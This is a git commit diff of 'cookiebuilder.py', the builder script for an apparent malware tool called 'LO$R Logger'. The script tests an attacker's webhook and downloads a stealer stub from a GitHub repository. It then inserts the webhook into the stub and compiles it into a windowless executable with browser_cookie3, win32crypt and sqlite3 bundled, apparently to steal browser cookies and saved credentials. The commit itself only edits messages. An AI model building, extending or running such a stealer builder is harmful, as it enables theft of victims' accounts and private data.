d95cc8ba154296d47d4da0b7e8952cfae0501046
LO$R <106779656+madhead341@users.noreply.github.com>
2023-04-05 02:11:45 +0200

    Update cookiebuilder.py

--- cookiebuilder.py
+++ cookiebuilder.py
@@ -6,7 +6,7 @@ import os
 import time
 import shutil
 os.system(f'cls & title LO$R Logger Builder!')
-Write.Print(Center.XCenter("""
+print(Center.XCenter("""
  /$$        /$$$$$$     /$$    /$$$$$$$        /$$                                                        
 | $$       /$$__  $$  /$$$$$$ | $$__  $$      | $$                                                        
 | $$      | $$  \ $$ /$$__  $$| $$  \ $$      | $$        /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$ 
@@ -25,7 +25,7 @@ if r.status_code == 200:
          Write.Print("Webhook Is Working\n",Colors.blue_to_purple, interval=0.01) 
          time.sleep(1) 
 else: 
-    Write.Print("Webhook Is Not Working\n",Colors.blue_to_purple, interval=0.01) 
+    Write.Print("Webhook Isn't working\n",Colors.blue_to_purple, interval=0.01) 
     time.sleep(3) 
     exit()
 name = Write.Input("Enter File Name:", Colors.blue_to_purple, interval=0.01)
@@ -33,16 +33,16 @@ stub = requests.get("https://raw.githubusercontent.com/madhead341/LOSR-Logger/ma
 with open(f"{name}.py", 'w', encoding='utf8') as f:
     f.write(stub.text.replace("webhooker", webhook))
 Write.Print("LO$R Logger Was SucessFully Built\n",Colors.blue_to_purple, interval=0.01)
-compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.blue_to_purple, interval=0.01)
-if compile == "y":
+exe = Write.Input("Complie To A Exe y/n:", Colors.blue_to_purple, interval=0.01)
+if exe == "y":
    os.system(f'pyinstaller --onefile --noconsole --hidden-import="requests" --hidden-import="discord" --hidden-import="browser_cookie3" --hidden-import="shutil" --hidden-import="base64" --hidden-import="win32crypt" --hidden-import="shutil" --hidden-import="sqlite3" --hidden-import="psutil" --hidden-import="colorama" {name}.py')
    os.remove(f'{name}.spec')
-   Write.Print("LO$R Logger Was SucessFully Complied In Dist Folder\n",Colors.blue_to_purple, interval=0.01) 
+   Write.Print("LO$R Logger was sucessfully complied in dist folder\n",Colors.blue_to_purple, interval=0.01) 
    time.sleep(2)
-   Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using LO$R Logger\n",Colors.blue_to_purple, interval=0.01) 
+   Write.Print("Compiled to exe. Exiting...\n",Colors.blue_to_purple, interval=0.01) 
    time.sleep(3)
    exit()
-elif compile == "n":
-   Write.Print("Thank You For Using LO$R Logger\n",Colors.blue_to_purple, interval=0.01) 
+elif exe == "n":
+   Write.Print("Not Compiled to exe. Exiting...\n",Colors.blue_to_purple, interval=0.01) 
    time.sleep(3)
    exit()
